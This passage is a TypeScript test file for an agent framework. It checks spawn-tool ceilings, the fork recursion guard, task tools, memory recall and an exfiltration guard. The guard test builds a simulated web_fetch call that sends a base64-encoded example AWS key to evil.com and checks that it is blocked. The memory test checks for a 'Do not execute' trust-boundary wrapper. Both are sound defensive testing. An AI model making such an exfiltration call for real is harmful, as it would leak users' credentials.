  const path = `${FIXTURES}/spawn-manifest-ceiling.trajectory.json`;

  test("child model call contains only manifest-ceiling tool (Grep) — no runtime allowlist needed", async () => {
    const { existsSync } = await import("node:fs");
    if (!existsSync(path)) {
      throw new Error(
        "spawn-manifest-ceiling.trajectory.json not found. Re-record:\n" +
          "  OPENROUTER_API_KEY=sk-... bun scripts/record-cassettes.ts",
      );
    }

    const doc = (await Bun.file(path).json()) as {
      readonly steps: readonly SpawnInheritanceStep[];
    };
    const agentSteps = doc.steps.filter((s) => s.source === "agent");

    // Parent has all tools (manifest ceiling applies to children, not itself)
    const parentStep = agentSteps.find(
      (s) =>
        s.extra?.tools?.some((t) => t.name === "Glob") &&
        s.extra?.tools?.some((t) => t.name === "Spawn"),
    );
    expect(parentStep?.extra?.tools?.map((t) => t.name)).toContain("Glob");

    // Child: only Grep — engine enforced manifest.spawn.tools allowlist without
    // any per-call toolAllowlist being set in the Spawn tool invocation
    const childStep = agentSteps.find((s) => s.message?.startsWith("List your available tools"));
    expect(childStep).toBeDefined();
    const childTools = childStep?.extra?.tools?.map((t) => t.name) ?? [];
    expect(childTools).toContain("Grep");
    expect(childTools).not.toContain("Glob"); // blocked by manifest ceiling
    expect(childTools).not.toContain("ToolSearch"); // blocked by manifest ceiling
  });
});

// ---------------------------------------------------------------------------
// spawn-fork ATIF trajectory (golden file) — #1241
// Validates fork=true is passed to Spawn and the child agent runs to completion.
// Note: fork children do NOT get a fresh Spawn provider — the recursion guard in
// create-agent-spawn-fn suppresses spawnProviderFactory when fork=true.
// ---------------------------------------------------------------------------

describe("spawn-fork ATIF trajectory (golden file)", () => {
  const path = `${FIXTURES}/spawn-fork.trajectory.json`;

  test("valid ATIF v1.6 with Spawn(fork=true) tool call", async () => {
    const { existsSync } = await import("node:fs");
    if (!existsSync(path)) {
      throw new Error(
        "spawn-fork.trajectory.json not found. Re-record:\n" +
          "  OPENROUTER_API_KEY=sk-... bun scripts/record-cassettes.ts",
      );
    }
    const doc = (await Bun.file(path).json()) as Record<string, unknown>;
    expect(doc.schema_version).toBe("ATIF-v1.6");
  });

  test("Spawn tool called with fork=true and child confirmed no Spawn tool", async () => {
    const { existsSync } = await import("node:fs");
    if (!existsSync(path)) return;

    const doc = (await Bun.file(path).json()) as {
      readonly steps: readonly SpawnInheritanceStep[];
    };
    const spawnStep = doc.steps
      .filter((s) => s.source === "tool")
      .find((s) => s.tool_calls?.some((tc) => tc.function_name === "Spawn"));

    expect(spawnStep).toBeDefined();
    const spawnCall = spawnStep?.tool_calls?.find((tc) => tc.function_name === "Spawn");
    expect(spawnCall?.arguments?.agentName).toBe("researcher");
    expect(spawnCall?.arguments?.fork).toBe(true);

    // The child was asked "Do you have a Spawn tool? Answer yes or no."
    // The fork recursion guard ensures the child does NOT receive Spawn.
    // Verify the child's answer is "no" in the recorded output.
    const rawContent = spawnStep?.observation?.results?.[0]?.content ?? "";
    const childOutput =
      typeof rawContent === "string"
        ? (() => {
            try {
              return (JSON.parse(rawContent) as { output?: string }).output ?? rawContent;
            } catch {
              return rawContent;
            }
          })()
        : String(rawContent);
    expect(childOutput.length).toBeGreaterThan(0);
    // Child should report NOT having Spawn — if this fails, the recursion guard regressed.
    expect(childOutput.toLowerCase()).toContain("no");
  });

  test("fork recursion guard: exactly one Spawn call in trajectory (child cannot re-delegate)", async () => {
    // This test pins the recursion guard contract: a forked child must NOT have access to Spawn.
    // If the guard breaks, the child would call Spawn again and the trajectory would contain a
    // second Spawn tool_call with a different agentId — this assertion catches that regression.
    const { existsSync } = await import("node:fs");
    if (!existsSync(path)) return;

    const doc = (await Bun.file(path).json()) as {
      readonly steps: readonly SpawnInheritanceStep[];
    };

    const spawnCalls = doc.steps
      .filter((s) => s.source === "tool")
      .flatMap((s) => s.tool_calls ?? [])
      .filter((tc) => tc.function_name === "Spawn");

    // Exactly one Spawn call: the parent's initial delegation.
    // A forked child receiving Spawn would produce a second entry here.
    expect(spawnCalls.length).toBe(1);
    expect(spawnCalls[0]?.arguments?.fork).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// spawn-coordinator ATIF trajectory (golden file) — #1241
// Validates coordinator agent is resolvable and its manifest allowlist ceiling
// restricts the child's tool surface to delegation-only tools.
// ---------------------------------------------------------------------------

describe("spawn-coordinator ATIF trajectory (golden file)", () => {
  const path = `${FIXTURES}/spawn-coordinator.trajectory.json`;

  test("valid ATIF v1.6 with Spawn to coordinator agent", async () => {
    const { existsSync } = await import("node:fs");
    if (!existsSync(path)) {
      throw new Error(
        "spawn-coordinator.trajectory.json not found. Re-record:\n" +
          "  OPENROUTER_API_KEY=sk-... bun scripts/record-cassettes.ts",
      );
    }
    const doc = (await Bun.file(path).json()) as Record<string, unknown>;
    expect(doc.schema_version).toBe("ATIF-v1.6");
  });

  test("Spawn tool called with agentName='coordinator' and coordinator was invoked", async () => {
    const { existsSync } = await import("node:fs");
    if (!existsSync(path)) return;

    const doc = (await Bun.file(path).json()) as {
      readonly steps: readonly SpawnInheritanceStep[];
    };
    const spawnStep = doc.steps
      .filter((s) => s.source === "tool")
      .find((s) => s.tool_calls?.some((tc) => tc.function_name === "Spawn"));

    expect(spawnStep).toBeDefined();
    const spawnCall = spawnStep?.tool_calls?.find((tc) => tc.function_name === "Spawn");
    expect(spawnCall?.arguments?.agentName).toBe("coordinator");
  });

  test("coordinator ceiling: no Glob, Grep, or ToolSearch calls in trajectory", async () => {
    // The coordinator's selfCeiling restricts it to delegation-only tools.
    // Glob, Grep, and ToolSearch must NOT appear in any tool call — they are parent tools
    // that the selfCeiling enforcement should have stripped from the coordinator's surface.
    // If this test fails, the coordinator received parent capabilities it shouldn't have.
    const { existsSync } = await import("node:fs");
    if (!existsSync(path)) return;

    const doc = (await Bun.file(path).json()) as {
      readonly steps: readonly SpawnInheritanceStep[];
    };

    const parentOnlyTools = new Set(["Glob", "Grep", "ToolSearch", "Read", "Bash"]);
    const leakedCalls = doc.steps
      .flatMap((s) => s.tool_calls ?? [])
      .filter((tc) => parentOnlyTools.has(tc.function_name ?? ""));

    // No parent-only tools should appear — coordinator ceiling is enforced.
    expect(leakedCalls).toHaveLength(0);
    if (leakedCalls.length > 0) {
      const names = leakedCalls.map((tc) => tc.function_name).join(", ");
      throw new Error(
        `Coordinator received parent tools that bypass selfCeiling: ${names}. ` +
          "Re-check selfCeiling enforcement in spawn-child.ts and create-agent-spawn-fn.ts.",
      );
    }
  });
});

// ---------------------------------------------------------------------------
// Standalone L2 golden: @koi/memory recall functions (no LLM needed)
// ---------------------------------------------------------------------------

describe("Golden: @koi/memory recall pipeline", () => {
  test("recallMemories scans, scores, budgets, and formats with trust boundary", async () => {
    const { recallMemories, computeDecayScore, computeTypeRelevance, computeSalience } =
      await import("@koi/memory");
    type FSBackend = import("@koi/core").FileSystemBackend;
    type FRResult = import("@koi/core").FileReadResult;
    type FLResult = import("@koi/core").FileListResult;
    type KErr = import("@koi/core").KoiError;
    type Res<T, E> = import("@koi/core").Result<T, E>;

    const now = Date.now();
    const DAY = 86_400_000;

    const files = new Map<string, { content: string; modifiedAt: number }>([
      [
        "/mem/user_role.md",
        {
          content:
            "---\nname: User role\ndescription: Go expert\ntype: user\n---\n\nDeep Go expertise.",
          modifiedAt: now - 1 * DAY,
        },
      ],
      [
        "/mem/feedback.md",
        {
          content:
            "---\nname: TDD\ndescription: write tests first\ntype: feedback\n---\n\nRule: failing tests first.",
          modifiedAt: now - 5 * DAY,
        },
      ],
      [
        "/mem/project.md",
        {
          content:
            "---\nname: v2 Goal\ndescription: ship by Q2\ntype: project\n---\n\nMerge freeze 2026-03-05.",
          modifiedAt: now - 30 * DAY,
        },
      ],
    ]);

    const mockFs: FSBackend = {
      name: "golden-mock-fs",
      read(path): Res<FRResult, KErr> {
        const f = files.get(path);
        if (!f)
          return { ok: false, error: { code: "NOT_FOUND", message: "nope", retryable: false } };
        return { ok: true, value: { content: f.content, path, size: f.content.length } };
      },
      list(path): Res<FLResult, KErr> {
        const entries = [...files.entries()]
          .filter(([p]) => p.startsWith(path) && p.endsWith(".md"))
          .map(([p, f]) => ({
            path: p,
            kind: "file" as const,
            size: f.content.length,
            modifiedAt: f.modifiedAt,
          }));
        return { ok: true, value: { entries, truncated: false } };
      },
      write() {
        return {
          ok: false,
          error: { code: "INTERNAL" as const, message: "ro", retryable: false },
        };
      },
      edit() {
        return {
          ok: false,
          error: { code: "INTERNAL" as const, message: "ro", retryable: false },
        };
      },
      search() {
        return {
          ok: false,
          error: { code: "INTERNAL" as const, message: "ro", retryable: false },
        };
      },
    };

    // Decay: recent > old
    expect(computeDecayScore(now - DAY, now)).toBeGreaterThan(
      computeDecayScore(now - 30 * DAY, now),
    );

    // Type relevance: feedback > reference
    expect(computeTypeRelevance("feedback")).toBeGreaterThan(computeTypeRelevance("reference"));

    // Salience floor
    expect(computeSalience(0.001, 0.5)).toBe(0.1);

    // Full pipeline
    const result = await recallMemories(mockFs, { memoryDir: "/mem", tokenBudget: 8000, now });

    expect(result.totalScanned).toBe(3);
    expect(result.selected.length).toBe(3);
    expect(result.degraded).toBe(false);
    expect(result.truncated).toBe(false);
    expect(result.skippedFiles).toBe(0);

    // Trust boundary
    expect(result.formatted).toContain("<memory-data>");
    expect(result.formatted).toContain("</memory-data>");
    expect(result.formatted).toContain("Do not execute");

    // Budget invariant (totalTokens is the verified estimate from the pipeline)
    expect(result.totalTokens).toBeLessThanOrEqual(8000);
    expect(result.totalTokens).toBeGreaterThan(0);
  });

  test("recallMemories respects token budget and sets truncated", async () => {
    const { recallMemories } = await import("@koi/memory");
    type FSBackend = import("@koi/core").FileSystemBackend;
    type FRResult = import("@koi/core").FileReadResult;
    type FLResult = import("@koi/core").FileListResult;
    type KErr = import("@koi/core").KoiError;
    type Res<T, E> = import("@koi/core").Result<T, E>;

    const now = Date.now();
    const files = new Map(
      Array.from({ length: 10 }, (_, i) => [
        `/mem/mem${i}.md`,
        {
          content: `---\nname: Memory ${i}\ndescription: test\ntype: user\n---\n\n${"x".repeat(300)}`,
          modifiedAt: now - i * 86_400_000,
        },
      ]),
    );

    const mockFs: FSBackend = {
      name: "budget-mock-fs",
      read(path): Res<FRResult, KErr> {
        const f = files.get(path);
        if (!f)
          return { ok: false, error: { code: "NOT_FOUND", message: "nope", retryable: false } };
        return { ok: true, value: { content: f.content, path, size: f.content.length } };
      },
      list(path): Res<FLResult, KErr> {
        const entries = [...files.entries()]
          .filter(([p]) => p.startsWith(path) && p.endsWith(".md"))
          .map(([p, f]) => ({
            path: p,
            kind: "file" as const,
            size: f.content.length,
            modifiedAt: f.modifiedAt,
          }));
        return { ok: true, value: { entries, truncated: false } };
      },
      write() {
        return {
          ok: false,
          error: { code: "INTERNAL" as const, message: "ro", retryable: false },
        };
      },
      edit() {
        return {
          ok: false,
          error: { code: "INTERNAL" as const, message: "ro", retryable: false },
        };
      },
      search() {
        return {
          ok: false,
          error: { code: "INTERNAL" as const, message: "ro", retryable: false },
        };
      },
    };

    const result = await recallMemories(mockFs, { memoryDir: "/mem", tokenBudget: 200, now });

    expect(result.selected.length).toBeLessThan(10);
    expect(result.truncated).toBe(true);
    expect(result.totalTokens).toBeLessThanOrEqual(200);
  });
});

// ---------------------------------------------------------------------------
// task-tools ATIF trajectory (golden file — produced by real LLM recording)
// ---------------------------------------------------------------------------

describe("task-tools ATIF trajectory (golden file)", () => {
  test("valid ATIF v1.6 with all 6 task tool definitions", async () => {
    const file = Bun.file(`${FIXTURES}/task-tools.trajectory.json`);
    if (!(await file.exists())) {
      console.warn("task-tools.trajectory.json not recorded yet — skipping");
      return;
    }
    const doc = (await file.json()) as {
      readonly schema_version: string;
      readonly agent: { readonly tool_definitions?: readonly { readonly name: string }[] };
    };
    expect(doc.schema_version).toBe("ATIF-v1.6");
    const toolNames = doc.agent.tool_definitions?.map((t) => t.name) ?? [];
    expect(toolNames).toContain("task_create");
    expect(toolNames).toContain("task_list");
    expect(toolNames).toContain("task_update");
    expect(toolNames).toContain("task_stop");
    expect(toolNames).toContain("task_output");
  });

  test("has at least one TOOL step for task_create — ok:true with task_1", async () => {
    const file = Bun.file(`${FIXTURES}/task-tools.trajectory.json`);
    if (!(await file.exists())) {
      console.warn("task-tools.trajectory.json not recorded yet — skipping");
      return;
    }
    const doc = (await file.json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly tool_calls?: readonly { readonly function_name: string }[];
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };
    const toolSteps = doc.steps.filter((s) => s.source === "tool");
    expect(toolSteps.length).toBeGreaterThanOrEqual(2);
    const createSteps = toolSteps.filter((s) =>
      s.tool_calls?.some((tc) => tc.function_name === "task_create"),
    );
    expect(createSteps.length).toBeGreaterThanOrEqual(1);
    // At least the first create should succeed with task_1
    const firstCreate = createSteps[0];
    const content = firstCreate?.observation?.results?.[0]?.content ?? "";
    expect(content).toContain('"ok":true');
    expect(content).toContain("task_1");
  });

  test("has TOOL step for task_list returning TaskSummary array", async () => {
    const file = Bun.file(`${FIXTURES}/task-tools.trajectory.json`);
    if (!(await file.exists())) {
      console.warn("task-tools.trajectory.json not recorded yet — skipping");
      return;
    }
    const doc = (await file.json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly tool_calls?: readonly { readonly function_name: string }[];
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };
    const toolSteps = doc.steps.filter((s) => s.source === "tool");
    const listStep = toolSteps.find((s) =>
      s.tool_calls?.some((tc) => tc.function_name === "task_list"),
    );
    expect(listStep).toBeDefined();
    const content = listStep?.observation?.results?.[0]?.content ?? "";
    expect(content).toContain('"tasks"');
    expect(content).toContain('"total"');
    // TaskSummary projection — no timestamps in list response
    expect(content).not.toContain('"createdAt"');
  });

  test("at least 2 tool steps and 2 agent steps (multi-turn)", async () => {
    const file = Bun.file(`${FIXTURES}/task-tools.trajectory.json`);
    if (!(await file.exists())) {
      console.warn("task-tools.trajectory.json not recorded yet — skipping");
      return;
    }
    const doc = (await file.json()) as {
      readonly steps: readonly { readonly source: string }[];
    };
    const agentSteps = doc.steps.filter((s) => s.source === "agent");
    const toolSteps = doc.steps.filter((s) => s.source === "tool");
    expect(agentSteps.length).toBeGreaterThanOrEqual(2);
    expect(toolSteps.length).toBeGreaterThanOrEqual(2);
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/task-tools (2 standalone queries, no LLM needed)
// ---------------------------------------------------------------------------

describe("Golden: @koi/task-tools", () => {
  test("task_create + task_list flow — create two tasks, list returns TaskSummary projection", async () => {
    const { createTaskTools } = await import("@koi/task-tools");
    const { createManagedTaskBoard, createMemoryTaskBoardStore } = await import("@koi/tasks");

    const store = createMemoryTaskBoardStore();
    const board = await createManagedTaskBoard({ store });
    const tools = createTaskTools({
      board,
      agentId: "golden-agent" as import("@koi/core").AgentId,
    });
    if (tools.length < 7) throw new Error("Expected 7 task tools");
    const [create, , , list] = tools as [
      import("@koi/core").Tool,
      import("@koi/core").Tool,
      import("@koi/core").Tool,
      import("@koi/core").Tool,
      import("@koi/core").Tool,
      import("@koi/core").Tool,
    ];

    const r1 = (await create.execute({
      subject: "Auth module",
      description: "Implement OAuth2",
    } as import("@koi/core").JsonObject)) as Record<string, unknown>;
    const r2 = (await create.execute({
      subject: "Write tests",
      description: "Write unit tests",
    } as import("@koi/core").JsonObject)) as Record<string, unknown>;
    expect(r1.ok).toBe(true);
    expect(r2.ok).toBe(true);

    const lr = (await list.execute({} as import("@koi/core").JsonObject)) as {
      ok: boolean;
      tasks: Record<string, unknown>[];
      total: number;
    };
    expect(lr.ok).toBe(true);
    expect(lr.total).toBe(2);
    expect(lr.tasks[0]).toHaveProperty("id");
    expect(lr.tasks[0]).toHaveProperty("subject");
    expect(lr.tasks[0]).toHaveProperty("status");
    // TaskSummary projection — no timestamps (full details via task_get)
    expect(lr.tasks[0]).not.toHaveProperty("createdAt");
  });

  test("task_stop returns error for pending task — not running (Decision 4A)", async () => {
    const { createTaskTools } = await import("@koi/task-tools");
    const { createManagedTaskBoard, createMemoryTaskBoardStore } = await import("@koi/tasks");

    const store = createMemoryTaskBoardStore();
    const board = await createManagedTaskBoard({ store });
    const tools = createTaskTools({
      board,
      agentId: "golden-agent" as import("@koi/core").AgentId,
    });
    if (tools.length < 7) throw new Error("Expected 7 task tools");
    const [create, , , , stop] = tools as [
      import("@koi/core").Tool,
      import("@koi/core").Tool,
      import("@koi/core").Tool,
      import("@koi/core").Tool,
      import("@koi/core").Tool,
      import("@koi/core").Tool,
    ];

    const r1 = (await create.execute({
      subject: "Auth",
      description: "Do auth",
    } as import("@koi/core").JsonObject)) as Record<string, unknown>;
    const id = (r1.task as Record<string, unknown>).id as string;

    const sr = (await stop.execute({
      task_id: id,
    } as import("@koi/core").JsonObject)) as Record<string, unknown>;
    expect(sr.ok).toBe(false);
    expect(sr.error as string).toContain("in_progress");
  });

  test("createTaskToolsProvider returns ComponentProvider with 7 tools under toolToken keys", async () => {
    const { createTaskToolsProvider } = await import("@koi/task-tools");
    const { createManagedTaskBoard, createMemoryTaskBoardStore } = await import("@koi/tasks");
    const { COMPONENT_PRIORITY } = await import("@koi/core");

    const store = createMemoryTaskBoardStore();
    const board = await createManagedTaskBoard({ store });
    const provider = createTaskToolsProvider({
      board,
      agentId: "golden-agent" as import("@koi/core").AgentId,
    });

    expect(provider.name).toBe("task-tools");
    expect(provider.priority).toBe(COMPONENT_PRIORITY.BUNDLED);

    // Attach and verify all 7 tools are registered
    const result = await provider.attach({} as never);
    const resultObj = result as unknown as Record<string, unknown>;
    const components =
      "components" in resultObj
        ? (resultObj.components as ReadonlyMap<string, unknown>)
        : (result as ReadonlyMap<string, unknown>);

    expect(components.size).toBe(7);
    const toolNames = [...components.keys()].sort();
    expect(toolNames).toEqual([
      "tool:task_create",
      "tool:task_delegate",
      "tool:task_get",
      "tool:task_list",
      "tool:task_output",
      "tool:task_stop",
      "tool:task_update",
    ]);
  });

  test("task_output with offset returns in_progress_output for streaming reads", async () => {
    const { createTaskTools } = await import("@koi/task-tools");
    const { createManagedTaskBoard, createMemoryTaskBoardStore } = await import("@koi/tasks");

    const store = createMemoryTaskBoardStore();
    const board = await createManagedTaskBoard({ store });

    const mockReader = {
      readOutput: (_taskId: import("@koi/core").TaskItemId, fromOffset?: number) => ({
        ok: true as const,
        value: {
          chunks: [{ offset: fromOffset ?? 0, content: "chunk data", timestamp: Date.now() }],
          nextOffset: (fromOffset ?? 0) + 10,
        },
      }),
    };

    const tools = createTaskTools({
      board,
      agentId: "golden-agent" as import("@koi/core").AgentId,
      outputReader: mockReader,
    });
    const [create, , update, , , output] = tools as [
      import("@koi/core").Tool,
      import("@koi/core").Tool,
      import("@koi/core").Tool,
      import("@koi/core").Tool,
      import("@koi/core").Tool,
      import("@koi/core").Tool,
    ];

    // Create and start a task
    const cr = (await create.execute({
      subject: "Streaming",
      description: "Test streaming",
    } as import("@koi/core").JsonObject)) as Record<string, unknown>;
    const id = (cr.task as Record<string, unknown>).id as string;
    await update.execute({ task_id: id, status: "in_progress" } as import("@koi/core").JsonObject);

    // Read with offset — should return in_progress_output
    const or = (await output.execute({
      task_id: id,
      offset: 5,
    } as import("@koi/core").JsonObject)) as {
      kind: string;
      chunks?: readonly { content: string }[];
      nextOffset?: number;
    };
    expect(or.kind).toBe("in_progress_output");
    expect(or.chunks).toHaveLength(1);
    expect(or.nextOffset).toBe(15);
  });
});

// ---------------------------------------------------------------------------
// Full-loop replay: spawn-tools cassette → createKoi → live ATIF
// Exercises: @koi/spawn-tools + @koi/task-tools wired through createKoi
// Cassette: LLM calls task_create (first turn); replay validates live ATIF
// ---------------------------------------------------------------------------

describe("Full-loop replay: spawn-tools cassette → createKoi → live ATIF", () => {
  test("task_create executes through full middleware stack and appears in live ATIF", async () => {
    const cassetteFile = Bun.file(`${FIXTURES}/spawn-tools.cassette.json`);
    if (!(await cassetteFile.exists())) {
      console.warn("spawn-tools.cassette.json not recorded yet — skipping");
      return;
    }
    const cassette = await loadCassette(`${FIXTURES}/spawn-tools.cassette.json`);
    const { createTaskTools } = await import("@koi/task-tools");
    const { createSpawnTools, createTaskCascade } = await import("@koi/spawn-tools");
    const { createManagedTaskBoard, createMemoryTaskBoardStore } = await import("@koi/tasks");

    const trajDir = `/tmp/koi-replay-spawn-tools-${Date.now()}`;
    trajDirs.push(trajDir);
    const docId = "replay-spawn-tools";

    const store = createAtifDocumentStore(
      { agentName: "replay-spawn-tools" },
      createFsAtifDelegate(trajDir),
    );
    const clock = createMonotonicClock();

    const { middleware: eventTrace } = createEventTraceMiddleware({
      store,
      docId,
      agentName: "replay-spawn-tools",
      clock,
    });

    const permBackend = createPermissionBackend({
      mode: "bypass",
      rules: [{ pattern: "*", action: "*", effect: "allow", source: "policy" as const }],
    });
    const permHandle = createPermissionsMiddleware({
      backend: permBackend,
      description: "replay test (bypass)",
    });

    // Board + spawn-tools setup
    const board = await createManagedTaskBoard({ store: createMemoryTaskBoardStore() });
    const agentId = "replay-agent" as import("@koi/core").AgentId;
    const taskTools = createTaskTools({ board, agentId });
    const spawnTools = createSpawnTools({
      spawnFn: async (req) => ({ ok: true, output: `stub: ${req.description}` }),
      board,
      agentId,
      signal: new AbortController().signal,
    });

    // createSingleToolProvider for each tool
    const toolArr = taskTools as import("@koi/core").Tool[];
    const ttCreate = toolArr[0];
    const ttDelegate = toolArr[6];
    const stAgentSpawn = (spawnTools as import("@koi/core").Tool[])[0];
    if (ttCreate === undefined || ttDelegate === undefined || stAgentSpawn === undefined) {
      throw new Error("Expected 7 task tools and 1 spawn tool");
    }

    const adapter = createCassetteAdapter(cassette.chunks);

    const runtime = await createKoi({
      manifest: { name: "replay-spawn-tools", version: "0.1.0", model: { name: MODEL } },
      adapter,
      middleware: [eventTrace, permHandle].map((mw) =>
        wrapMiddlewareWithTrace(mw, { store, docId, clock }),
      ),
      providers: [
        createSingleToolProvider({
          name: "task-create",
          toolName: "task_create",
          createTool: () => ttCreate,
        }),
        createSingleToolProvider({
          name: "task-delegate",
          toolName: "task_delegate",
          createTool: () => ttDelegate,
        }),
        createSingleToolProvider({
          name: "agent-spawn",
          toolName: "agent_spawn",
          createTool: () => stAgentSpawn,
        }),
      ],
      loopDetection: false,
    });

    for await (const _e of runtime.run({
      kind: "text",
      text: "Use task_create to create a task with subject 'Research caching strategies' and description 'Investigate Redis vs Memcached'.",
    })) {
      /* drain */
    }

    await runtime.dispose();
    await new Promise((r) => setTimeout(r, 300));

    const steps = await store.getDocument(docId);

    // task_create tool was executed and recorded in live ATIF
    const toolSteps = steps.filter((s) => s.kind === "tool_call");
    expect(toolSteps.length).toBeGreaterThan(0);
    const taskCreateStep = toolSteps.find((s) => s.identifier === "task_create");
    expect(taskCreateStep).toBeDefined();
    expect(taskCreateStep?.outcome).toBe("success");

    // TaskCascade is available (imported from @koi/spawn-tools — validates L2 wiring)
    const cascade = createTaskCascade(board);
    expect(cascade).toBeDefined();
    expect(typeof cascade.findReady).toBe("function");
    expect(typeof cascade.detectCycles).toBe("function");

    // MW spans fired (event-trace + permissions wired through createKoi)
    const mwSpans = steps.filter((s) => s.metadata?.type === "middleware_span");
    expect(mwSpans.length).toBeGreaterThan(0);

    // Model step present (cassette drove the model call)
    const modelSteps = steps.filter(
      (s) => s.kind === "model_call" && !s.identifier.startsWith("middleware:"),
    );
    expect(modelSteps.length).toBeGreaterThanOrEqual(1);
  }, 15000);
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/spawn-tools (2 standalone queries, no LLM needed)
// ---------------------------------------------------------------------------

describe("Golden: @koi/spawn-tools", () => {
  test("TaskCascade.detectCycles — returns undefined for valid DAG", async () => {
    const { createTaskCascade } = await import("@koi/spawn-tools");
    const { createManagedTaskBoard, createMemoryTaskBoardStore } = await import("@koi/tasks");

    const store = createMemoryTaskBoardStore();
    const board = await createManagedTaskBoard({ store });

    // Linear chain: A → B → C (no cycles)
    const idA = await board.nextId();
    await board.add({ id: idA, description: "Task A", dependencies: [] });
    const idB = await board.nextId();
    await board.add({ id: idB, description: "Task B", dependencies: [idA] });
    const idC = await board.nextId();
    await board.add({ id: idC, description: "Task C", dependencies: [idB] });

    const cascade = createTaskCascade(board);
    expect(cascade.detectCycles()).toBeUndefined();
    expect(cascade.findReady()).toContain(idA);
    expect(cascade.findReady()).not.toContain(idB);
    expect(cascade.findReady()).not.toContain(idC);
  });

  test("TaskCascade.findReady — unblocks task after dependencies complete", async () => {
    const { mkdtemp } = await import("node:fs/promises");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const { createTaskCascade } = await import("@koi/spawn-tools");
    const { createManagedTaskBoard, createMemoryTaskBoardStore } = await import("@koi/tasks");

    const store = createMemoryTaskBoardStore();
    const resultsDir = await mkdtemp(join(tmpdir(), "golden-spawn-"));
    const board = await createManagedTaskBoard({ store, resultsDir });
    const agentId = "golden-agent" as import("@koi/core").AgentId;

    const idA = await board.nextId();
    await board.add({ id: idA, description: "Prerequisite A", dependencies: [] });
    const idB = await board.nextId();
    await board.add({ id: idB, description: "Depends on A", dependencies: [idA] });

    const cascade = createTaskCascade(board);
    expect(cascade.findReady()).toContain(idA);
    expect(cascade.findReady()).not.toContain(idB);

    // Complete A — now B should be ready
    await board.assign(idA, agentId);
    await board.completeOwnedTask(idA, agentId, { taskId: idA, output: "Done A", durationMs: 0 });

    expect(cascade.findReady()).toContain(idB);
    expect(cascade.findReady()).not.toContain(idA); // completed, not pending
  });
});

// ---------------------------------------------------------------------------
// @koi/spawn-tools ATIF trajectory (golden file — produced by real LLM recording)
// ---------------------------------------------------------------------------

describe("spawn-tools ATIF trajectory (golden file)", () => {
  test("schema_version is ATIF-v1.6", async () => {
    const file = Bun.file(`${FIXTURES}/spawn-tools.trajectory.json`);
    if (!(await file.exists())) {
      console.warn("spawn-tools.trajectory.json not recorded yet — skipping");
      return;
    }
    const traj = (await file.json()) as { schema_version?: string };
    expect(traj.schema_version).toBe("ATIF-v1.6");
  });

  test("trajectory contains task_create tool call", async () => {
    const file = Bun.file(`${FIXTURES}/spawn-tools.trajectory.json`);
    if (!(await file.exists())) {
      console.warn("spawn-tools.trajectory.json not recorded yet — skipping");
      return;
    }
    const traj = (await file.json()) as {
      steps?: ReadonlyArray<{
        source?: string;
        tool_calls?: ReadonlyArray<{ function_name?: string }>;
      }>;
    };
    const toolSteps = (traj.steps ?? []).filter((s) => s.source === "tool");
    const toolNames = toolSteps.flatMap((s) => (s.tool_calls ?? []).map((tc) => tc.function_name));
    expect(toolNames).toContain("task_create");
  });

  test("trajectory contains task_delegate tool call (coordinator fan-out)", async () => {
    const file = Bun.file(`${FIXTURES}/spawn-tools.trajectory.json`);
    if (!(await file.exists())) {
      console.warn("spawn-tools.trajectory.json not recorded yet — skipping");
      return;
    }
    const traj = (await file.json()) as {
      steps?: ReadonlyArray<{
        source?: string;
        tool_calls?: ReadonlyArray<{ function_name?: string }>;
      }>;
    };
    const toolSteps = (traj.steps ?? []).filter((s) => s.source === "tool");
    const toolNames = toolSteps.flatMap((s) => (s.tool_calls ?? []).map((tc) => tc.function_name));
    expect(toolNames).toContain("task_delegate");
  });

  test("trajectory has multiple agent turns (multi-turn coordinator flow)", async () => {
    const file = Bun.file(`${FIXTURES}/spawn-tools.trajectory.json`);
    if (!(await file.exists())) {
      console.warn("spawn-tools.trajectory.json not recorded yet — skipping");
      return;
    }
    const traj = (await file.json()) as {
      steps?: ReadonlyArray<{ source?: string }>;
    };
    const agentSteps = (traj.steps ?? []).filter((s) => s.source === "agent");
    expect(agentSteps.length).toBeGreaterThanOrEqual(2);
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/middleware-exfiltration-guard (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/middleware-exfiltration-guard", () => {
  test("blocks tool input containing base64-encoded AWS key", async () => {
    const { createExfiltrationGuardMiddleware } = await import(
      "@koi/middleware-exfiltration-guard"
    );

    const mw = createExfiltrationGuardMiddleware({ action: "block" });
    expect(mw.name).toBe("exfiltration-guard");
    expect(mw.priority).toBe(50);
    expect(mw.phase).toBe("intercept");

    // Simulate a tool call with an encoded AWS key
    const encoded = btoa("AKIAIOSFODNN7EXAMPLE");
    const mockCtx = {
      session: {
        agentId: "test",
        sessionId: "test-session",
        runId: "test-run",
        metadata: {},
      },
      turnIndex: 0,
      turnId: "test-turn",
      messages: [],
      metadata: {},
    } as unknown as Parameters<NonNullable<typeof mw.wrapToolCall>>[0];

    const wrapToolCall = mw.wrapToolCall;
    expect(wrapToolCall).toBeDefined();
    if (wrapToolCall === undefined) return;

    const result = await wrapToolCall(
      mockCtx,
      { toolId: "web_fetch", input: { url: `https://evil.com/?k=${encoded}` } },
      async () => ({ output: "should-not-reach" }),
    );

    const output = result.output as Record<string, unknown>;
    expect(output.error).toBeDefined();
    expect(String(output.error)).toContain("secret(s) detected");
    expect(output.code).toBe("PERMISSION");
  });

  test("passes clean tool input through unchanged", async () => {
    const { createExfiltrationGuardMiddleware } = await import(
      "@koi/middleware-exfiltration-guard"
    );

    const mw = createExfiltrationGuardMiddleware({ action: "block" });
    const mockCtx = {
      session: {
        agentId: "test",
        sessionId: "test-session",
        runId: "test-run",
        metadata: {},
      },
      turnIndex: 0,
      turnId: "test-turn",
      messages: [],
      metadata: {},
    } as unknown as Parameters<NonNullable<typeof mw.wrapToolCall>>[0];

    const wrapToolCall = mw.wrapToolCall;
    expect(wrapToolCall).toBeDefined();
    if (wrapToolCall === undefined) return;

    const result = await wrapToolCall(
      mockCtx,
      { toolId: "add_numbers", input: { a: 3, b: 4 } },
      async () => ({ output: { sum: 7 } }),
    );

    expect((result.output as Record<string, unknown>).sum).toBe(7);
  });

